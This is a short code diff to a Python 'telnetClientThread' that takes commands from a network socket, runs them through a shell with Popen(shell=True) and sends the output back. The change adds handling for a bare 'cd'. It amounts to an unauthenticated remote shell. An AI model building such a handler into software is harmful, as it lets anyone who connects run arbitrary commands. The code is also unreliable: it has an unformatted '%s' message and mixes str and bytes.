@@ -24,11 +24,15 @@ class telnetClientThread(threading.Thread):
                 cmd = self.conn.recv(256)
                 print(cmd)
                 if cmd[:2] == 'cd':
-                    currpath = os.getcwd()
-                    os.chdir(cmd[3:])
-                    if os.getcwd() == currpath:
-                        cmdout = "bash: cd: %s: No such file or directory"
-                        self.conn.send(cmdout.encode(encoding='utf-8'))
+                    if len(cmd) == 2:
+                        cmdout = os.getcwd()
+                        self.conn.send(cmdout)
+                    else:
+                        currpath = os.getcwd()
+                        os.chdir(cmd[3:])
+                        if os.getcwd() == currpath:
+                            cmdout = "bash: cd: %s: No such file or directory"
+                            self.conn.send(cmdout)
                 else:
                     proc = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
                     cmdout = proc.stdout.read()
